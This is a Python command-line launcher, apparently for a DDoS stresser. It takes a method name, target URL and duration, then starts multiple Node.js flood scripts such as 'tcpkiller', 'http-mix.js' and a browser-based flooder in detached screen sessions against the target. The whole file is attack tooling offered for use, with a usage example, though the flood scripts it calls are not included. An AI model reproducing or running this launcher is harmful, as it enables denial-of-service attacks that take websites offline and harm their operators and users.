import os
import sys
import time
from colorama import Fore

method = sys.argv[1].upper()
target = sys.argv[2]
time = sys.argv[3]

if method == "GET":
    os.system(f"screen -dm node attack.js {target} {time} 75")
elif method == "GET2":
    os.system(f"screen -dm node http22.js {target} {time}")
    os.system(f"screen -dm node http22.js {target} {time}")
    os.system(f"screen -dm node http22.js {target} {time}")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
elif method == "POST":
    os.system(f"screen -dm node http-p.js {target} {time} 500") 
    os.system(f"screen -dm node http-p.js {target} {time} 500") 
    os.system(f"screen -dm node http-p.js {target} {time} 500") 
    os.system(f"screen -dm node http-p.js {target} {time} 500") 
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")  
elif method == "MIX":
    os.system(f"screen -dm node http-mix.js {target} {time} 500")
    os.system(f"screen -dm node http-mix.js {target} {time} 500")
    os.system(f"screen -dm node http-mix.js {target} {time} 500")
    os.system(f"screen -dm node http-mix.js {target} {time} 500")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
elif method == "QUERY":
    os.system(f"screen -dm node http-query.js {target} {time} 500")
    os.system(f"screen -dm node http-query.js {target} {time} 500")
    os.system(f"screen -dm node http-query.js {target} {time} 500")
    os.system(f"screen -dm node http-query.js {target} {time} 500")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
elif method == "HTTPSOCKET":
    os.system(f"screen -dm ./query {target} {time} 450 2")
    os.system(f"screen -dm node tls {target} {time} 1 2.txt")
elif method == "BROWSER":
    os.system(f"screen -dm node play {target} {time} 5 http.txt")
else:
    print(f"""
{Fore.RED}[ERROR]: Invalid syntax{Fore.RESET}
{Fore.YELLOW}[SYNTAX]: python3 send.py [method] {target} [time]{Fore.RESET}
{Fore.GREEN}[EXAMPLE]: python3 send.py get https://example.com/ 120{Fore.RESET}
""")
    exit()
